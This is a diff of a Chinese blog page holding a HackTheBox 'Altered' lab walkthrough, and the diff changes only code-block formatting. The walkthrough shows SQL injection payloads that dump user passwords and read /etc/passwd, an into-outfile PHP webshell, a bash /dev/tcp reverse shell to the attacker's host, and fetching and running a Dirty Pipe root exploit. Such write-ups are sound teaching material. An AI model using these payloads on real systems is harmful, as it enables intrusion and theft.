@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="实验环境 寻找立足点端口扫描先对靶机进行端口扫描，发现只开放了22和80端口 nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap   登陆界面攻击面测试访问80端口，是一个登录界面，先尝试登录  发现当输入账号为test时返回用无效用户名，当输入用户名为admin时返回密码无效，存在用户名枚举   还有一个忘记密码的功能，试试能不能修改admin的密码，发现需">
+    <meta name="description" content="实验环境 寻找立足点端口扫描先对靶机进行端口扫描，发现只开放了22和80端口 1nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap   登陆界面攻击面测试访问80端口，是一个登录界面，先尝试登录  发现当输入账号为test时返回用无效用户名，当输入用户名为admin时返回密码无效，存在用户名枚举   还有一个忘记密码的功能，试试能不能修改admin的密码，发现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-Altered">
 <meta property="og:url" content="http://example.com/2022/04/08/HackTheBox-Altered/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="实验环境 寻找立足点端口扫描先对靶机进行端口扫描，发现只开放了22和80端口 nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap   登陆界面攻击面测试访问80端口，是一个登录界面，先尝试登录  发现当输入账号为test时返回用无效用户名，当输入用户名为admin时返回密码无效，存在用户名枚举   还有一个忘记密码的功能，试试能不能修改admin的密码，发现需">
+<meta property="og:description" content="实验环境 寻找立足点端口扫描先对靶机进行端口扫描，发现只开放了22和80端口 1nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap   登陆界面攻击面测试访问80端口，是一个登录界面，先尝试登录  发现当输入账号为test时返回用无效用户名，当输入用户名为admin时返回密码无效，存在用户名枚举   还有一个忘记密码的功能，试试能不能修改admin的密码，发现">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png">
@@ -208,8 +208,8 @@
   <div class="content" itemprop="articleBody">
     <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png"></p>
 <h2 id="寻找立足点"><a href="#寻找立足点" class="headerlink" title="寻找立足点"></a>寻找立足点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>先对靶机进行端口扫描，发现只开放了22和80端口</p>
-<pre><code>nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png"></p>
 <h3 id="登陆界面攻击面测试"><a href="#登陆界面攻击面测试" class="headerlink" title="登陆界面攻击面测试"></a>登陆界面攻击面测试</h3><p>访问80端口，是一个登录界面，先尝试登录</p>
 <p><img src="https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png"></p>
@@ -264,46 +264,42 @@
 <p>将<code>3</code>的位置替换为SQL语句可以成功执行</p>
 <p><img src="https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png"></p>
 <p>先爆出所有数据库名</p>
-<pre><code class="mysql">-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png"></p>
 <p>爆出所有表名和列名</p>
-<pre><code class="mysql">-2 union select 1,2,group_concat(&#39;\n&#39;,table_name,&#39;:&#39;,column_name) from information_schema.columns where table_schema=&#39;uhc&#39;-- -
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2 union select 1,2,group_concat(&#x27;\n&#x27;,table_name,&#x27;:&#x27;,column_name) from information_schema.columns where table_schema=&#x27;uhc&#x27;-- -</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png"></p>
 <p>爆出<code>users</code>表的内容</p>
-<pre><code class="sql">-2 union select 1,2,group_concat(&#39;\n&#39;,name,&#39;:&#39;,password) from uhc.users-- -
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="string">&#x27;\n&#x27;</span>,name,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> uhc.users<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png"></p>
 <p>但是我们已经有<code>admin</code>的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了<code>/etc/passwd</code>文件</p>
-<pre><code class="mysql">-2 union select 1,2,load_file(&#39;/etc/passwd&#39;)-- -
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2 union select 1,2,load_file(&#x27;/etc/passwd&#x27;)-- -</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png"></p>
 <p>接下来的思路是通过<code>SQL注入</code>往站点写<code>shell</code>，来获得服务器权限，但是先要知道站点的真实路径</p>
 <h3 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h3><p>在最开始的端口扫描中可以看到，该站点使用了<code>Nginx</code>作为中间件，我们可以读取<code>Nginx</code>的站点配置文件，来查看配置的站点根目录。尝试读取<code>Nginx</code>的站点配置文件的默认路径</p>
-<pre><code class="sql">-2 union select 1,2,load_file(&#39;/etc/nginx/sites-enabled/default&#39;)-- -
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;/etc/nginx/sites-enabled/default&#x27;</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png"></p>
 <p>如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写<code>shell</code>，来得到服务器的初步控制权</p>
 <p>通过<code>into outfile</code>向网站根目录写入<code>0.php</code>，返回<code>服务器错误</code>，但是不影响</p>
-<pre><code class="sql">-2 union select 1,2,&#39;&lt;?=`$_GET[1]`?&gt;&#39; into outfile&#39;/srv/altered/public/0.php&#39;-- -
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?=`$_GET[1]`?&gt;&#x27;</span> <span class="keyword">into</span> outfile<span class="string">&#x27;/srv/altered/public/0.php&#x27;</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png"></p>
 <p>访问我们的<code>shell</code>，能成功执行系统命令</p>
 <p><img src="https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png"></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>通过我们写入的<code>webshell</code>，反弹一个<code>shell</code>回来，翻遍后续的操作</p>
-<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#39;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png"></p>
 <p><img src="https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png"></p>
 <p>本地开启的监听接收到了反弹<code>shell</code></p>
 <p>通过以下命令，将反弹回来的<code>shell</code>升级为完全交互式的<code>shell</code></p>
-<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-ctrl+z
-stty raw -echo; fg
-reset
-xterm
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ctrl+z</span><br><span class="line">stty raw -echo; fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png"></p>
 <h3 id="Dirty-Pipe提权漏洞"><a href="#Dirty-Pipe提权漏洞" class="headerlink" title="Dirty Pipe提权漏洞"></a>Dirty Pipe提权漏洞</h3><p>查看系统的版本为<code>5.16</code></p>
 <p><img src="https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png"></p>
@@ -316,19 +312,15 @@ xterm
 <p>这台靶机服务器的版本在影响范围内，所以我们可以直接下载<code>exploit</code>并编译，上传到靶机中执行，来获得<code>root</code>权限</p>
 <p>现在攻击机下载<a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">DirtyPipe-Exploits</a>，并编译。因为攻击机和靶机的Linux版本不一样，所以使用<code>-fPIC -static</code>参数进行编译，防止因编译环境不一致导致<code>exploit</code>运行出现问题</p>
 <p><img src="https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png"></p>
-<pre><code>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c</span><br><span class="line"></span><br><span class="line">gcc exploit-2.c -o exp -fPIC -static </span><br></pre></td></tr></table></figure>
 
-gcc exploit-2.c -o exp -fPIC -static 
-</code></pre>
 <p>在攻击机用<code>python</code>起一个简易的服务器</p>
-<pre><code>python3 -m http.server 80
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png"></p>
 <p>在靶机下载，并赋予执行权限</p>
-<pre><code>wget 10.10.16.6/exp
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.6/exp</span><br><span class="line"></span><br><span class="line">chmod +x ./exp</span><br></pre></td></tr></table></figure>
 
-chmod +x ./exp
-</code></pre>
 <p>按照<code>exploit</code>作者的使用方法，执行<code>exploit</code>劫持<code>SUID</code>成功提升至<code>root</code>权限</p>
 <p><img src="https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png"></p>
 <p><img src="https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png"></p>
